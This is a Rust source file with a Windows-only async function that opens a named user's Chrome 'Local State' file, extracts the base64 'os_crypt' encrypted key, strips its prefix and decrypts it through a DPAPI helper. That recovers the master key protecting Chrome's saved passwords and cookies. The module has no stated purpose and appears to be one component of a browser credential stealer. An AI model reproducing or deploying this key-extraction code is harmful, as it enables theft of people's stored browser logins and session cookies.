use base64::engine::general_purpose;
use base64::Engine;
use serde_json::Value;
use std::io::ErrorKind;
use tokio::io::Error;
use tokio::{fs::File, io::AsyncReadExt};

#[cfg(windows)]
use super::decrypt_key::decrypt_data_key;

#[cfg(windows)]
pub async fn get_encryption_key(username: String) -> Result<Vec<u8>, Error> {
    let local_state_path = format!(
        r"C:\Users\{}\AppData\Local\Google\Chrome\User Data\Local State",
        username
    );
    let mut local_state_file = match File::open(local_state_path).await {
        Ok(file) => file,
        Err(e) => return Err(e),
    };
    let mut local_state = String::new();
    local_state_file.read_to_string(&mut local_state).await?;

    let local_state: Value = match serde_json::from_str(&local_state) {
        Ok(val) => val,
        Err(e) => return Err(e.into()),
    };

    let encrypted_key = local_state["os_crypt"]["encrypted_key"].as_str().unwrap();
    let encrypted_key = general_purpose::STANDARD.decode(encrypted_key).unwrap();
    let unencoded_key = encrypted_key[5..].to_vec();

    match decrypt_data_key(unencoded_key).await {
        Ok(key) => Ok(key),
        Err(e) => Err(tokio::io::Error::new(ErrorKind::Other, format!("{}", e))),
    }
}
